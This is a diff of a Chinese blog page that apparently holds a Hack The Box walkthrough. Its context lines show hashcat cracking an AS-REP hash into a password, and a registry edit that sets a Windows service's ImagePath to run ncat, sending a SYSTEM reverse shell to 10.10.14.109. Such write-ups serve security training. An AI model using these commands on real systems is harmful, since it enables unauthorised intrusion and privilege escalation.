 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Kerberos support for Dynamic Access Control on this device has been disabled.</span><br></pre></td></tr></table></figure>
 
@@ -424,43 +312,15 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 18200 -D 1 -a 0 -n 10 hash.txt &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt  --force</span><br><span class="line"></span><br><span class="line">rainforest786</span><br></pre></td></tr></table></figure>
 
 <h1 id="jorden"><a href="#jorden" class="headerlink" title="jorden"></a>jorden</h1><p>使用这个密码登录jorden：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050610.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050610.jpg" alt=""></p>
 <p> 使用winPEAS我们可以发现这个用户可以控制系统服务：</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050611.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050611.jpg" alt=""></p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>那么我们可以随意修改一个服务的imagepath，重启服务，反弹system权限的shell：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">REG add HKLM\System\CurrentControlSet\Services\SensorDataService &#x2F;v ImagePath &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;cmd.exe &#x2F;c C:\temp\ncat.exe 10.10.14.109 8888 -e cmd.exe&quot; &#x2F;f</span><br><span class="line">sc.exe start SensorDataService</span><br></pre></td></tr></table></figure>
 
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050612.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050612.jpg" alt=""></p>
 <h1 id="root-flag"><a href="#root-flag" class="headerlink" title="root flag"></a>root flag</h1><p>在Administrator用户桌面得到root.txt:</p>
-<figure class="image-bubble">
-                <div class="img-lightbox">
-                    <div class="overlay"></div>
-                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050613.jpg" alt="" title="">
-                </div>
-                <div class="image-caption"></div>
-            </figure>
-
+<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020050613.jpg" alt=""></p>
 <h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
 <li>Querying Active Directory Data from SQL Server<br><a href="https://www.mssqltips.com/sqlservertip/2580/querying-active-directory-data-from-sql-server/" target="_blank" rel="noopener">https://www.mssqltips.com/sqlservertip/2580/querying-active-directory-data-from-sql-server/</a></li>
 <li>Get Active Directory Users and Groups with SQL Server Integration Services<br><a href="https://www.mssqltips.com/sqlservertip/1657/get-active-directory-users-and-groups-with-sql-server-integration-services/" target="_blank" rel="noopener">https://www.mssqltips.com/sqlservertip/1657/get-active-directory-users-and-groups-with-sql-server-integration-services/</a></li>
@@ -478,7 +338,7 @@
     <div class="content">
         
 <span class="post-time">
-    最后更新时间：<time datetime="2020-09-21T00:32:17.492Z" itemprop="dateUpdated">2020-09-21 08:32:17</time>
+    Last updated: <time datetime="2020-09-21T00:32:17.492Z" itemprop="dateUpdated">2020-09-21 08:32:17</time>
 </span><br>
 
 
@@ -645,11 +505,11 @@
             
                 <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
             
-            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
+            <span>This blog is licensed under a <a rel="license noopener" href="https://creativecommons.org/licenses/by/4.0/" target="_blank">Creative Commons Attribution 4.0 International License</a>.</span>
         </p>
     </div>
     <div class="bottom">
-        <p><span>暗羽 &copy; 2014 - 2023</span>
+        <p><span>暗羽 &copy; 2014 - 2024</span>
             <span>
                 
                 Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
